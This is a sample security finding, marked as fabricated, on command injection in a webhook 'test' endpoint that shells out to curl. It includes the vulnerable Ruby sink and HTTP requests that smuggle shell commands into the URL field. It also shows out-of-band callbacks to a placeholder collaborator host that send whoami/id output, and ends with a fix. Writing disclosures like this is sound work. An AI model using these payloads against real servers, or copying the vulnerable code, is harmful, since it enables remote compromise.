# Remote code execution in webhook test endpoint: command injection via the URL host field

> EXAMPLE / DUMMY FINDING — illustrative only. Target, IDs, and code are fabricated.

## Summary
The "test webhook" feature shells out to `curl` to probe the configured URL, building the
command by string-interpolating the user-supplied host into a shell invocation. A maintainer
injects shell metacharacters into the host and runs arbitrary commands on the application
server.
**Root cause:** `WebhookTester#probe` passes an interpolated string to a shell
(`system("curl ... #{url}")`) instead of an argument array.

## Severity
`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` = **9.9 (Critical)**
PR:L (any user who can configure a webhook); S:C (escapes the app into the host OS); full
C:H/I:H/A:H on the server.

## Affected / tested versions
- Affected: `app v5.0 – v5.4.1`   Fixed in: `v5.4.2`   Tested build: `v5.4.1`

## Roles involved
- **Attacker:** any user who can create/test a webhook (project Maintainer-equivalent).
- **Victim / policy bypassed:** the application server / all data and tenants it hosts.

## Preconditions
- Permission to configure a webhook and click "Test" (default for Maintainers).
- No outbound network needed — the injection runs locally regardless of curl's result.

## Mechanism (code-level root cause)
1. **Entry point** — `POST /webhooks/test` → `WebhooksController#test`
   (`app/controllers/webhooks_controller.rb:22`), authorizes only `can_manage_webhooks?`.
2. **Sink** — `lib/webhook_tester.rb:14`:
```ruby
# lib/webhook_tester.rb:14
def probe(url)
  system("curl -s -o /dev/null -w '%{http_code}' #{url}")   # <-- url interpolated into a shell
end
```
`url` is the raw user-supplied webhook URL/host. Shell metacharacters are not escaped and the
single-string form of `system` invokes `/bin/sh -c`.
**Proof of intent (sibling control):** another outbound call in the same file uses the safe
array form, showing the project knows the pattern — `probe` is the outlier:
```ruby
# lib/webhook_tester.rb:31  — safe: no shell, args passed as array
system("curl", "-s", url)
```

## Steps to Reproduce
Replace `<host>`, `<token>`, `<id>`.

### Part A — setup
**Step 1.** As a Maintainer of project `<id>`, prepare a webhook whose URL carries a shell
payload.

### Part B — exploit
**Step 2 (control — a benign URL behaves normally).**
```http
POST /webhooks/test HTTP/1.1
Host: <host>
Authorization: Bearer <token>
Content-Type: application/json

{"project_id":"<id>","url":"http://127.0.0.1/"}
```
```http
HTTP/1.1 200 OK
{"http_code":"000"}
```

**Step 3 (bug — injected command executes on the server).**
```http
POST /webhooks/test HTTP/1.1
Host: <host>
Authorization: Bearer <token>
Content-Type: application/json

{"project_id":"<id>","url":"http://127.0.0.1/; id > /tmp/pwned; echo "}
```
```http
HTTP/1.1 200 OK
```
The `; id > /tmp/pwned` segment runs in the shell. (Use an out-of-band callback such as
`; curl http://<collaborator>/$(whoami)` to prove execution without filesystem access.)
> `[SCREENSHOT HERE: the OOB callback hit, or /tmp/pwned containing the `id` output]`

## Observed (live)
On `v5.4.1` at `example.com`, a webhook URL of
`http://x/; curl http://<collaborator>/$(id|tr ' ' '_')` produced an OOB HTTP callback to the
collaborator containing `uid=1001(app)_gid=1001(app)…`, confirming command execution as the
`app` service user on the application host.

## Impact
Arbitrary command execution on the application server as the service user: full read/write of
all tenants' data, lateral movement, persistence, and denial of service. Complete server
compromise from a low-privileged in-app role.

## Suggested Fix
Never build shell strings from user input. Use the argument-array form (no `/bin/sh`), and
validate the URL scheme/host first:
```ruby
# lib/webhook_tester.rb:14
system("curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", url)   # no shell interpolation
```
Also restrict the webhook URL to `http(s)` and block internal/loopback hosts (defends SSRF too).

## References
CWE-78 (OS Command Injection). OWASP A03:2021 (Injection).
